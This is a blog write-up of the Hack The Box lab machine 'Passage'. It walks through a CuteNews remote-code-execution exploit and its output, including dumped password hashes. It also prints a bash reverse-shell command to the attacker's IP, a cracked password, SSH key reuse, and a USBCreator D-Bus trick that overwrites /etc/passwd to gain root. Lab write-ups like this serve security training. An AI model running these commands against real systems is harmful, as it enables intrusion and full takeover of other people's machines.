---
id: 3544
title: 'Hackthebox &#8211; Passage'
date: '2022-04-15T12:35:39+00:00'
author: vedanttare
excerpt: 'In this post, we are going to be pwning "Passage" from Hackthebox.'
layout: post
guid: 'http://vedanttare.com/?p=3544'
permalink: /hackthebox-passage/
powerkit_share_buttons_transient_facebook:
    - '1692134038'
powerkit_share_buttons_transient_pinterest:
    - '1727901985'
image: 'http://vedanttare.com/wp-content/uploads/2022/04/Screenshot-2022-09-25-at-11.44.31-AM-1-496x166.png'
categories:
    - Writeups
---

![](http://vedanttare.com/wp-content/uploads/2022/04/Screenshot-2022-09-25-at-11.40.54-AM.png)

IP: 10.10.10.126

More information:

Potential usernames:  
Kim Swift  
Sid Meier  
Paul Coles : paul@passage.htb  
In the blog id=11 is by admin with after hovering over the admin tag it says — nadav@passage.htb

/etc/apt/sources.bak file readable.

## Enumeration

Looking at the webpage we see that it is a cms and the application running is CuteNews.

![](http://vedanttare.com/wp-content/uploads/2022/04/cutenews-webpage.png)

Searching on google we find a rce exploit for it.

![](http://vedanttare.com/wp-content/uploads/2022/04/cutenews-exploit.png)

Running the exploit we get a shell with www-data.

![](http://vedanttare.com/wp-content/uploads/2022/04/execute-rce.png)

Then, using a rev shell payload we get a connection on our machine to run more commands and spawn a pty shell using python.

`kali@starscorp1o:~/htb/active_boxes/passage$ sudo python3 48800.py<br></br>[sudo] password for kali:`

```
       _____     __      _  __                     ___   ___  ___ 
      / ___/_ __/ /____ / |/ /__ _    _____       |_  | <  / |_  |
     / /__/ // / __/ -_)    / -_) |/|/ (_-<      / __/_ / / / __/ 
     \___/\_,_/\__/\__/_/|_/\__/|__,__/___/     /____(_)_(_)____/ 
                            ___  _________                        
                           / _ \/ ___/ __/                        
                          / , _/ /__/ _/                          
                         /_/|_|\___/___/                          
```

`[->] Usage python3 expoit.py`

`Enter the URL> http://10.10.10.206/`

`Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN`

`7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1<br></br>4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88<br></br>e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd<br></br>f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca`

`4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc`

`=============================`

`Registering a users`

`[+] Registration successful with username: VYbDl6D9sk and password: VYbDl6D9sk`

`=======================================================`

`Sending Payload`

`signature_key: 6ec99478e182f49816cb960348faf43e-VYbDl6D9sk<br></br>signature_dsi: a0ca4b62c742b3e1a5661c1847ba9edb`

`logged in user: VYbDl6D9sk`

`Dropping to a SHELL`

`command > /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.4/9000 0>&1'`

## Privilege Escalation

As we have shell as www-data, now by checking /etc/passwd, we see that we have 2 more users:

- nadav
- paul

Let’s start enumerating the root directory of cutenews. There were a lot of php files present.

![](http://vedanttare.com/wp-content/uploads/2022/04/php-files.png)

After tons and tons of enumeration in multiple files. We found bas64 encoded strings from various php files. One was of nadav user and many others but, we know that there are only 2 users paul and nadav , so we need to find files that have session info of these users. We then get nadav’s and paul’s session files with id, username and a password hash in it.

Now, we try to crack nadav’s hash but it doesnt work.

![](http://vedanttare.com/wp-content/uploads/2022/04/nadav-pass-not-work.png)

 We now try to crack paul’s hash and BOOM!!!…We get a password:  
`atlanta1`

![](http://vedanttare.com/wp-content/uploads/2022/04/paul-pass.png)

Now that we have paul’s password we can just su into that user. We go and grab the user.txt file.

Cracking paul’s password:

![](http://vedanttare.com/wp-content/uploads/2022/04/cracking-pauls-password.png)

p`aul@passage:~$ cat user.txt<br></br>cat user.txt<br></br>0d58c8c9c9701f91c2fb5c850c7c92b4`

Now we have just look around in the home directory by using ls -la to list hidden files and check in .ssh for keys to nadav. We see that id\_rsa.pub shows the public key of nadav but we are in paul’s home directory, so this might mean that they share public and private keys. Checking in id\_rsa for private key we see that there is a private.

![](http://vedanttare.com/wp-content/uploads/2022/04/idrsa.png)

We copy that onto our machine and do chmod 600 and try to login with ssh:

`ssh -i ssh_private_key nadav@10.10.10.206`

![](http://vedanttare.com/wp-content/uploads/2022/04/login-as-nadav.png)

And boom we get a shell as nadav!!!!!!

Now we have to get root. (This is the tough part!)

After looking all over the internet and enumerating the home directory of nadav we see that there is an ibus program and after searching on google we come across one article on whole of google:

`USBCreator D-Bus Privilege Escalation in Ubuntu Desktop`

![](http://vedanttare.com/wp-content/uploads/2022/04/ibus-privesc.png)

D-Bus Privilege Escalation article:

![](http://vedanttare.com/wp-content/uploads/2022/04/article-ibus.png)

This article explains all the steps to get root by abusing the usbcreator application which uses a tool called dd which in turn in used to write to disks using python, but there is no sanitization check as to what and where the file is being written and it also doesn’t ask for the password for sudo program when used.

Hence we use this to get root:  
We overwrite the /etc/passwd file by generating a openssl passwd for root user and placing it in the /etc/passwd file:

`kali@starscorp1o:~/htb/active_boxes/passage$ openssl passwd alice<br></br>wBl9BxxE0AUq6`

![](http://vedanttare.com/wp-content/uploads/2022/04/openssl-pass.png)

Then overwriting the file using the following command given in the article:

`nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /home/nadav/passwd /etc/passwd true<br></br>()`

Command used in the article:

![](http://vedanttare.com/wp-content/uploads/2022/04/command-used-article.png)

Command we used:

![](http://vedanttare.com/wp-content/uploads/2022/04/ibus-command.png)

/`etc/passwd` file has been overwritten:

![](http://vedanttare.com/wp-content/uploads/2022/04/etcpasswd-overwrite.png)

The parenthesis is not included in the command it is displayed after the command is executed. And we just su to root:

`nadav@passage:~$ su root<br></br>Password:<br></br>root@passage:/home/nadav# id<br></br>uid=0(root) gid=0(root) groups=0(root)<br></br>root@passage:/home/nadav# whoami<br></br>root<br></br>root@passage:/home/nadav# hostname<br></br>passage<br></br>root@passage:/home/nadav# id<br></br>uid=0(root) gid=0(root) groups=0(root)`

![](http://vedanttare.com/wp-content/uploads/2022/04/got-the-root.png)

And BOOM!! We get root!!!!

Now, we can grab the user flag:

![](http://vedanttare.com/wp-content/uploads/2022/04/user-flaggg.png)

Hence we can grab the root flag:

`root@passage:~# cat root.txt<br></br>67ab751857e4be0ad3f2186c9b6f4164`

![](http://vedanttare.com/wp-content/uploads/2022/04/check-root-flag.png)

Check out my previous post:

<figure class="wp-block-embed is-type-wp-embed is-provider-vedant-tare wp-block-embed-vedant-tare"><div class="wp-block-embed__wrapper">> [Hackthebox – Postman](https://vedanttare.com/hackthebox-postman/)

<iframe class="wp-embedded-content" data-secret="rUO077kPM8" frameborder="0" height="338" marginheight="0" marginwidth="0" sandbox="allow-scripts" scrolling="no" security="restricted" src="https://vedanttare.com/hackthebox-postman/embed/#?secret=NDOo3RZ5ZQ#?secret=rUO077kPM8" style="position: absolute; clip: rect(1px, 1px, 1px, 1px);" title="“Hackthebox – Postman” — VEDANT TARE" width="600"></iframe></div></figure>